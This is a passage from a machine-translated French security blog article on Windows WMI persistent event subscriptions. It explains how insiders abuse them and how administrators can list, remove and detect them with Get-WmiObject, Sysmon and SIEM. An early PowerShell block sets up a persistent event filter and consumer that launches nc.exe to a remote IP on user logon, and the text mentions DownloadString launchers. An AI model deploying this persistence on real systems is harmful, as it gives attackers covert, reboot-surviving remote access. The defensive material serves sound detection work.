L'étude des événements persistants prendra un certain temps, mais ils représentent le moyen le plus efficace de mettre en œuvre un système de surveillance rigoureux pour les grands systèmes. Ils ont plus de capacités que les événements WMI temporaires. Ils peuvent également être utilisés pour vous alerter d'une activité malveillante non standard, telle que la tunnelisation DNS ou les violations de stratégie </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zero Trust.</font></font></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
J'ai passé quelques jours à étudier les événements persistants et j'ai constaté que PowerShell avait une applet de commande spéciale qui simplifie le processus de création d'un filtre d'événements, d'un consommateur et d'objets WMI entre le filtre et le consommateur. Comme nous le savons tous, PowerShell offre aux administrateurs de nombreuses opportunités de simplifier leur travail. Malheureusement, cet exemple montre comment les attaquants peuvent tirer parti de ces excellentes fonctionnalités. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Un initié crée un événement constant sur le système cible, se libérant ainsi de la nécessité d'être présent dans une session shell. L'événement y reste pour toujours ou jusqu'à ce qu'il soit explicitement supprimé. Vous pouvez en savoir plus sur la façon de procéder </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ici.</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mais dans l'ensemble, le processus est similaire à ce que j'ai fait ci-dessus avec un événement temporaire. </font><font style="vertical-align: inherit;">La dernière chose dont notre pirate a besoin est d'associer un filtre d'événements à un consommateur d'événements. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Je conviens que pour un employé ordinaire qui a soudainement décidé de devenir un pirate maléfique, cela a l'air trop cool. </font><font style="vertical-align: inherit;">Par intérêt, j'ai lu divers </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">forums</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> et j'ai vu que beaucoup de gens luttent sans succès pour que les événements constants de WMI fonctionnent. </font><font style="vertical-align: inherit;">Cependant, cela ne va pas au-delà des capacités de nos "Snowden" et d'autres administrateurs système avisés qui ont décidé de passer du côté obscur.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Événements constants: conseils pour les administrateurs informatiques</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/8c/gh/rn/8cghrnfq5mao1zm9d5-95y2kdys.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ces méthodes ne visent pas à former des pirates informatiques potentiels ou des employés offensés qui souhaitent se venger de l'employeur. </font><font style="vertical-align: inherit;">Tout ce que je veux faire, c'est aider les informaticiens à comprendre l'état d'esprit du pirate afin qu'ils puissent mettre en œuvre une protection appropriée contre les attaques de pénétration. </font><font style="vertical-align: inherit;">Pour eux, je montre comment configurer le filtre et les objets de consommation à l'aide de l' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">applet de commande Set-WmiInstance</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
<font></font>
EventNamespace = 'root/cimv2'<font></font>
Name = “cruella”<font></font>
Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
<font></font>
<font></font>
$command = "powershell.exe -Command {$names = gwmi Win32_Process; $users=@(); foreach ($n in $names) {$users += $n.GetOwner().User}; foreach ($u in $users) {if ($u -eq 'cruella') { C:\users\lex\Documents\nc.exe 172.31.45.240 10000}}}"<font></font>
<font></font>
<font></font>
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{<font></font>
Name = "Consumer"<font></font>
CommandLineTemplate = $Command<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Votre devoir est de trouver du code PowerShell qui relie ces deux composants ensemble. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Au cours de mes propres tests, j'ai pu obtenir un événement permanent pour travailler sur le système cible sans effort ni souffrance indus. </font><font style="vertical-align: inherit;">Comme vous vous en souvenez, cela a été très difficile à réaliser avec des événements WMI temporaires qui durent aussi longtemps qu'une session PowerShell.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En configurant un événement WMI persistant, par exemple, pour surveiller la connexion des utilisateurs, un initié ou un pirate n'est pas tenu de rester dans le système cible. Un avantage supplémentaire est qu'un événement WMI persistant est robuste: lorsque l'ordinateur redémarre, les déclencheurs d'événements fonctionnent toujours. Cela fait des événements persistants WMI un moyen puissant et secret de déclencher une attaque, ce qui peut impliquer bien plus qu'une simple surveillance. Comme vous vous en souvenez, les événements WMI sont loin d'être le premier endroit où les spécialistes de la sécurité rechercheront la source de l'attaque. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Par exemple, le code PowerShell pour un consommateur d'événements peut agir comme un lanceur et télécharger des logiciels malveillants stockés sur un serveur distant à l'aide de </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadString</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Grande </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">présentation</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Matt Graber à la conférence Black Hat contient beaucoup d'informations sur le potentiel malveillant des événements WMI persistants. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si vous êtes un spécialiste de la sécurité, comment allez-vous travailler avec les événements WMI en termes d'utilisation potentielle malveillante? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bonne chance de votre côté: à l'aide de l'applet de commande Get-WmiObject (alias gwmi), vous pouvez créer une liste de filtres d'événements, de consommateurs et d'objets de liaison:</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ug/ql/gd/ugqlgdjx1alwtunb4oczheoxh3k.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Vous répertoriez les événements persistants WMI à l'aide de Get-WMIObject et définissez les paramètres appropriés. </font><font style="vertical-align: inherit;">Notez l'absence d'horodatage. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Désormais, s'ils trouvent suspect le filtre (ou consommateur) d'un événement permanent, les informaticiens peuvent le désactiver en le supprimant à l'aide du pipeline PowerShell et de l' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">applet de commande WMI-RemoveObject</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/uo/t-/lj/uot-ljlw9zzi_jw5xosdyeaikwa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 La suppression d'événements WMI persistants implique l'utilisation du pipeline PowerShell. </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Notez que ni l'heure de génération de l'événement ni le nom de l'utilisateur malveillant ne sont spécifiés ici. </font><font style="vertical-align: inherit;">Pour obtenir ces informations médico-légales, vous devrez consulter les journaux des événements Windows. </font><font style="vertical-align: inherit;">Plus d'informations ci-dessous.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Puis-je désactiver les événements WMI persistants?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
À tout le moins, les professionnels de l'informatique peuvent rapidement voir les événements persistants WMI enregistrés et commencer à analyser des scénarios réels pour détecter des signes de menaces. Peut-être, en tant que spécialiste de la sécurité informatique expérimenté, vous pensez que tout le monde n'a pas besoin de WMI sur les ordinateurs portables et la meilleure stratégie pour faire face aux vulnérabilités d'événements persistants WMI est de désactiver complètement WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous pouvez essayer de désactiver le service </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Winmgmt</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , qui démarre WMI. En pratique, ce n'est pas si simple. Au cours de mes propres tests, je n'ai pas pu désactiver ce service: il a redémarré automatiquement encore et encore. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Supposons que vous ayez quand même réussi à le désactiver. Le logiciel d'administration Windows dépend fortement de WMI et ne fonctionnera pas si Winmgmt n'est pas disponible. </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;">Forums</font></a><font style="vertical-align: inherit;"> partout sur Internet</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rempli de messages mettant en garde contre la désactivation de WMI. </font><font style="vertical-align: inherit;">Je vous conseille d'écouter et d'avoir pitié de votre WMI.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Identifier les événements WMI de menace avec Sysmon et SIEM</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En général, vous devrez accepter la vulnérabilité d'événement WMI comme un fait. Heureusement, il existe des moyens plus efficaces pour détecter les événements persistants et autres opérations d'événement suspect sur Windows que d'utiliser l'applet de commande Powershell susmentionnée. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Rencontrez Sysmon! Je n'entrerai pas dans les détails de cet utilitaire Windows gratuit, qui peut être téléchargé </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dans cet article. Je peux seulement dire qu'il vous permet d'obtenir des informations très utiles pour l'analyse en un seul endroit, au lieu de visualiser chaque journal des événements Windows individuellement. Les utilisateurs de Windows 7 et versions ultérieures peuvent ne pas avoir besoin de Sysmon, car les nouveaux systèmes Windows utilisent des mécanismes de journalisation standard plus avancés.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/tv/-l/_2/tv-l_2ztyvfhhag1nf3faxi5qji.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Sysmon est un outil de journalisation des événements pratique et intuitif de Microsoft. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sysmon attribue l'identifiant d'événement 19 à la création d'un événement de filtre WMI permanent (20 est attribué pour créer un événement consommateur WMI et 21 est affecté à la liaison WMI). Si vous ouvrez l'Observateur d'événements, vous trouverez le journal des événements Sysmon dans la section Microsoft -&gt; Windows -&gt; Sysmon. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous ne souhaitez pas ouvrir l'observateur d'événements manuellement pour surveiller les événements WMI persistants, ce qui peut être un signe d'activité de pirate. Nous savons comment vous aider. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pourquoi ne pas créer un filtre d'événements persistants WMI pour surveiller la création (deviné?) D'un événement persistant WMI? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">github</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Il y a un petit projet où vous trouverez du code pour configurer cette opération. </font><font style="vertical-align: inherit;">Voici un extrait de code pour un filtre d'événement WMI qui vous permet de suivre la création de ... oui, un filtre d'événement WMI:</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
EventNamespace = 'root/subscription'<font></font>
Name = '_PersistenceEvent_'<font></font>
Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 Where TargetInstance ISA "__EventConsumer"'<font></font>
<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Évidemment, nous avons ici besoin de l'aide d'outils de sécurité de l'information et de gestion des événements de sécurité (SIEM), car les preuves sont enfouies dans les décombres des magazines. </font><font style="vertical-align: inherit;">Je pense que vous comprenez où tout va. </font><font style="vertical-align: inherit;">Vous aurez besoin d'une </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">solution de surveillance de la sécurité</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> qui combine les fonctionnalités SIEM avec l'analyse d'autres menaces pour détecter et éliminer les menaces associées aux événements WMI persistants.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Foire aux questions sur l'instrumentation de gestion Windows</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Les méthodes décrites ci-dessus peuvent très bien être utilisées pour implémenter un système de surveillance sur votre réseau, cependant, vous pourriez avoir des questions sur WMI. </font><font style="vertical-align: inherit;">Dans cette section, nous répondrons aux plus courants.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI est-il obsolète?</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI lui-même n'est pas obsolète, mais WMIC a été déprécié, ce qui prête à confusion pour de nombreuses personnes. </font><font style="vertical-align: inherit;">PowerShell est désormais utilisé pour accéder aux fonctions précédemment fournies par WMIC.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Quels ports WMI utilise-t-il? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
WMI utilise le port TCP 135 et un certain nombre de ports dynamiques: 49152-65535 (ports RPC dynamiques: Windows Vista, 2008 et supérieur), TCP 1024-65535 (ports RPC dynamiques: Windows NT4, Windows 2000, Windows 2003). </font><font style="vertical-align: inherit;">Vous pouvez également configurer une plage de ports personnalisée pour WMI.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WMI utilise-t-il WimRM? </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette configuration n'est pas standard, mais vous pouvez utiliser WMI pour récupérer des données à l'aide de scripts ou d'applications à l'aide de l'API de script WinRM ou à l'aide de l'outil de ligne de commande Winrm. </font><font style="vertical-align: inherit;">WinRM peut utiliser WMI pour collecter des données de ressources ou pour gérer des ressources dans le système d'exploitation Windows.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Conclusion</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comme nous l'avons vu, WMI fournit aux administrateurs un outil puissant pour surveiller les processus et les ordinateurs distants et peut être utilisé pour développer des accords de surveillance des utilisateurs finaux (EUMA) pour alerter automatiquement les activités suspectes. </font><font style="vertical-align: inherit;">Cela en fait un excellent outil pour détecter et éliminer les menaces internes, empêcher les tentatives de contournement des politiques de sécurité et surveiller l'utilisation de vos systèmes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si vous souhaitez en savoir plus sur la façon d'utiliser WMI pour surveiller l'activité des initiés, vous pouvez télécharger notre guide détaillé </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr507048/index.html">Olya, tests et usine - le chemin vers une architecture magnifique et du code propre</a></li>
<li><a href="../fr507050/index.html">Analyse de la conception du jeu Hollow Knight. Partie 1. Carrefour oublié</a></li>
<li><a href="../fr507052/index.html">Le Data Scientist le plus cool ne perd pas de temps en statistiques</a></li>
<li><a href="../fr507058/index.html">Joel Spolsky: rôle de ludification dans le succès du débordement de pile</a></li>
<li><a href="../fr507066/index.html">10 façons d'automatiser les publicités sur Google Ads</a></li>
<li><a href="../fr507074/index.html">Aide-mémoire SIMD, maintenant pour .NET Core</a></li>
<li><a href="../fr507078/index.html">Le tribunal a ordonné aux médias de retirer l'article de quelqu'un d'autre et de publier une réfutation sur le principal Yandex</a></li>
<li><a href="../fr507080/index.html">Toutes les coupes: l'histoire d'une conception de grand écosystème</a></li>
<li><a href="../fr507084/index.html">Les fêtes SpatialChat sont devenues populaires pendant la pandémie - et il est peu probable qu'elles se terminent après l'anse</a></li>
<li><a href="../fr507086/index.html">Convertir le script Bash en code C # pour envoyer des SMS via le modem USB HUAWEI E3372</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>